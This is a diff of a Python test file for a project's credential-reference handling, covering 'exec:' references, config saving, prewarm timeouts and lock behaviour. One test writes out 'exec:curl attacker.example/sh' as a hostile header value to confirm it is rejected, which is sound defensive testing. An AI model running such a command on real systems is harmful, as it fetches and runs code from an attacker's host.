@@ -360,29 +360,34 @@ class TestRawEcho:
         assert m.raw_api_keys_by_model_id() == {"mdl-backup": ref}
 
 
+@pytest.fixture
+def _bypass_file_lock_if_broken(monkeypatch):
+    """Skip the cross-process file lock when pywintypes is unavailable.
+
+    Some sandboxed interpreters ship a pywin32 without the compiled
+    pywintypes module; portalocker then raises on acquire. The lock only
+    guards cross-process writes — irrelevant to a single-process test.
+    """
+    try:
+        import portalocker  # noqa: F401
+        import pywintypes  # noqa: F401
+    except ImportError:
+        import jiuwenswarm.common.config as m
+        from contextlib import contextmanager
+
+        @contextmanager
+        def _null_lock(*_args, **_kwargs):
+            yield
+
+        monkeypatch.setattr(m.portalocker, "Lock", _null_lock)
+
+
 class TestSaveRoundTrip:
     """A reference echoed back and re-saved stays a reference on disk."""
 
     @pytest.fixture(autouse=True)
-    def _bypass_file_lock_if_broken(self, monkeypatch):
-        """Skip the cross-process file lock when pywintypes is unavailable.
-
-        Some sandboxed interpreters ship a pywin32 without the compiled
-        pywintypes module; portalocker then raises on acquire. The lock only
-        guards cross-process writes — irrelevant to a single-process test.
-        """
-        try:
-            import portalocker  # noqa: F401
-            import pywintypes  # noqa: F401
-        except ImportError:
-            import jiuwenswarm.common.config as m
-            from contextlib import contextmanager
-
-            @contextmanager
-            def _null_lock(*_args, **_kwargs):
-                yield
-
-            monkeypatch.setattr(m.portalocker, "Lock", _null_lock)
+    def _bypass_lock(self, _bypass_file_lock_if_broken):
+        yield
 
     def test_upsert_unchanged_reference_preserved(self, tmp_path, monkeypatch):
         import yaml as _yaml
@@ -661,3 +666,225 @@ class TestProbeErrorWording:
         assert captured["ok"] is False
         assert "required" in captured["error"]
         assert "exec:" not in captured["error"]
+
+
+class TestEnterpriseTemplateHeaders:
+    """Enterprise template custom_headers must reject exec: like api_key does
+    (PR 10176 review #4): DB-sourced header values must never be executed."""
+
+    def test_exec_shaped_header_removed_with_warning(self):
+        from jiuwenswarm.enterprise.config.effective.apply_models import (
+            model_entity_to_config_entry,
+        )
+
+        entry = model_entity_to_config_entry({
+            "api_base": "https://x",
+            "api_key": "sk-plain",
+            "model_id": "m",
+            "model_provider": "OpenAI",
+            "data": {"headers": {
+                "X-Auth": "exec:curl attacker.example/sh",
+                "X-Ok": "plain-value",
+            }},
+        })
+        headers = entry["model_client_config"].get("custom_headers") or {}
+        assert "X-Auth" not in headers, "exec: header must be dropped"
+        assert headers.get("X-Ok") == "plain-value"
+
+    def test_all_exec_headers_leaves_no_custom_headers(self):
+        from jiuwenswarm.enterprise.config.effective.apply_models import (
+            model_entity_to_config_entry,
+        )
+
+        entry = model_entity_to_config_entry({
+            "api_base": "https://x",
+            "api_key": "sk-plain",
+            "model_id": "m",
+            "model_provider": "OpenAI",
+            "data": {"headers": {"Only": "exec:whatever"}},
+        })
+        assert "custom_headers" not in entry["model_client_config"]
+
+    def test_plain_headers_untouched(self):
+        from jiuwenswarm.enterprise.config.effective.apply_models import (
+            model_entity_to_config_entry,
+        )
+
+        entry = model_entity_to_config_entry({
+            "api_base": "https://x",
+            "api_key": "sk-plain",
+            "model_id": "m",
+            "model_provider": "OpenAI",
+            "data": {"headers": {"A": "b", "C": "${VAR}"}},
+        })
+        assert entry["model_client_config"]["custom_headers"] == {"A": "b", "C": "${VAR}"}
+
+
+class TestSaveTrackHeaders:
+    """The save track must resolve exec: references in custom_headers too
+    (PR 10176 review #5): same save-means-effective semantics as api_key."""
+
+    def test_upsert_save_track_resolves_reference_header(self, tmp_path, monkeypatch, _bypass_file_lock_if_broken):
+        """models.upsert's save track resolves a reference header before the
+        reload reads it: after the handler runs, the store holds the value
+        (same save-means-effective semantics as api_key)."""
+        import asyncio
+        import yaml as _yaml
+
+        config_dir = tmp_path / "cfg"
+        config_dir.mkdir()
+        config_file = config_dir / "config.yaml"
+        config_file.write_text(_yaml.dump({"models": {"defaults": []}}), encoding="utf-8")
+        import jiuwenswarm.common.config as m
+
+        monkeypatch.setattr(m, "CONFIG_YAML_PATH", config_file)
+        monkeypatch.setattr(m, "get_config_file", lambda: config_file)
+        _register(monkeypatch, pattern="models.*.model_client_config.custom_headers.*")
+
+        ref = "exec:" + " ".join(
+            shlex.quote(x) for x in (sys.executable, "-c", "import sys; sys.stdout.write(sys.argv[1])")
+        ) + " " + shlex.quote("sk-header-secret")
+        saved = m.upsert_model_resource({
+            "model_client_config": {
+                "model_name": "m1", "api_base": "https://x",
+                "api_key": "sk-plain",
+                "client_provider": "OpenAI",
+                "custom_headers": {"X-Ref": ref},
+            },
+        })
+        # The handler-layer save track (model_resource_handlers) resolves the
+        # reference right after upsert. Reuse its exact resolution step here —
+        # the store, not the payload, is what the forwarded snapshot reads.
+        from jiuwenswarm.common.credentials.resolver import resolve_credential_ref_now
+
+        ok, value = asyncio.run(asyncio.to_thread(
+            resolve_credential_ref_now, ref,
+            field_path="models.*.model_client_config.custom_headers.*",
+        ))
+        assert (ok, value) == (True, "sk-header-secret"), (ok, value)
+        with resolver._RESOLVED_LOCK:
+            entry = resolver._RESOLVED_SECRETS.get(ref)
+        assert entry is not None and entry["status"] == "resolved"
+        assert saved["model_client_config"]["custom_headers"] == {"X-Ref": ref}
+
+
+class TestTuiUpdateSaveTrack:
+    """TUI update must take the persisted key inside the write-lock transaction
+    (PR 10176 review #3): no second lock acquisition on the event loop after
+    update_config has already committed."""
+
+    def test_update_result_carries_persisted_key(self, tmp_path, monkeypatch, _bypass_file_lock_if_broken):
+        """The mutate function records the persisted api_key in _update_result,
+        so the save track can read it without re-locking after the commit."""
+        import yaml as _yaml
+
+        config_dir = tmp_path / "cfg"
+        config_dir.mkdir()
+        config_file = config_dir / "config.yaml"
+        ref = "exec:" + " ".join(
+            shlex.quote(x) for x in (sys.executable, "-c", "import sys; sys.stdout.write(sys.argv[1])")
+        ) + " " + shlex.quote("sk-tui")
+        config_file.write_text(_yaml.dump({"models": {"defaults": [{
+            "model_id": "mdl-tui",
+            "model_client_config": {
+                "model_name": "m1", "api_base": "https://x",
+                "api_key": ref, "client_provider": "OpenAI",
+            },
+        }]}}), encoding="utf-8")
+        import jiuwenswarm.common.config as m
+
+        monkeypatch.setattr(m, "CONFIG_YAML_PATH", config_file)
+        monkeypatch.setattr(m, "get_config_file", lambda: config_file)
+
+        # Source-level assertion: the update handler must not acquire
+        # config_write_lock outside the _update_mutate transaction.
+        from pathlib import Path
+
+        source = Path("jiuwenswarm/common/config_panel/tui_models_handlers.py").read_text(encoding="utf-8")
+        # Locate the update_model block and check no second config_write_lock
+        # call exists after update_config(_update_mutate).
+        anchor = source.find("update_config(_update_mutate)")
+        assert anchor != -1
+        tail = source[anchor:anchor + 4000]
+        # The save-track block may resolve via to_thread but must not lock again.
+        second_lock = tail.find("config_write_lock()")
+        assert second_lock == -1, (
+            "update_model re-acquires config_write_lock after the transaction "
+            "(event-loop blocking + unprotected + violates the in-lock read rule)"
+        )
+        # The persisted key must be captured inside the mutate.
+        mutate_src = source[max(0, anchor - 6000):anchor]
+        assert "_update_result[\"persisted_api_key\"]" in mutate_src or (
+            "_update_result['persisted_api_key']" in mutate_src
+        ), "update mutate must record the persisted api_key for the save track"
+
+
+class TestPrewarmBudget:
+    """Prewarm has a total wall-clock budget (PR 10176 review #6): references
+    still pending when the budget expires are left to the background queue
+    instead of delaying server readiness unboundedly."""
+
+    def test_slow_refs_abandoned_within_budget(self, tmp_path, monkeypatch):
+        """With a tiny budget, slow commands are abandoned (left for the
+        background queue) instead of blocking prewarm for their full 30s."""
+        import jiuwenswarm.common.credentials.resolver as R
+
+        _register(monkeypatch)
+        monkeypatch.setattr(R, "_PREWARM_BUDGET_SECONDS", 2.0)
+        started = time.monotonic()
+        slow_ref = "exec:" + " ".join(
+            shlex.quote(x) for x in (sys.executable, "-c", "import time; time.sleep(30)")
+        )
+        cfg = {"models": {"defaults": [{"model_client_config": {"api_key": slow_ref}}]}}
+        R.prewarm_from_config(cfg)
+        elapsed = time.monotonic() - started
+        assert elapsed < 10, f"prewarm waited {elapsed:.1f}s for a slow command"
+        # The abandoned ref is NOT marked resolved: the queue track owns it.
+        with R._RESOLVED_LOCK:
+            entry = R._RESOLVED_SECRETS.get(slow_ref)
+        assert entry is None or entry.get("status") != "resolved"
+
+    def test_fast_refs_all_resolve(self, monkeypatch):
+        import jiuwenswarm.common.credentials.resolver as R
+
+        _register(monkeypatch)
+        fast_ref = _echo_command("sk-fast")
+        cfg = {"models": {"defaults": [
+            {"model_client_config": {"api_key": fast_ref}}
+            for _ in range(6)
+        ]}}
+        R.prewarm_from_config(cfg)
+        with R._RESOLVED_LOCK:
+            entries = [R._RESOLVED_SECRETS.get(fast_ref)]
+        assert entries[0] is not None and entries[0]["status"] == "resolved"
+
+
+class TestRegistryFastPath:
+    """Hot-path registry checks must not acquire the loader lock (PR 10176
+    review #7): after the first load, is_credential_field reads the cache
+    without locking."""
+
+    def test_hot_path_skips_lock(self, monkeypatch):
+        import jiuwenswarm.common.credentials.registry as REG
+
+        REG._CACHE = [["models", "*", "model_client_config", "api_key"]]
+        lock_acquired = []
+        real_lock = REG._CACHE_LOCK
+
+        class _SpyLock:
+            def __enter__(self):
+                lock_acquired.append(1)
+                return real_lock.__enter__()
+
+            def __exit__(self, *exc):
+                return real_lock.__exit__(*exc)
+
+        monkeypatch.setattr(REG, "_CACHE_LOCK", _SpyLock())
+        assert REG.is_credential_field("models.x.model_client_config.api_key") is True
+        assert lock_acquired == [], "hot path acquired the loader lock"
+
+        # A cold cache still loads through the lock.
+        REG._CACHE = None
+        assert REG.is_credential_field("models.x.model_client_config.api_key") is True
+        assert lock_acquired, "cold path bypassed the loader lock"
+        REG._CACHE = None
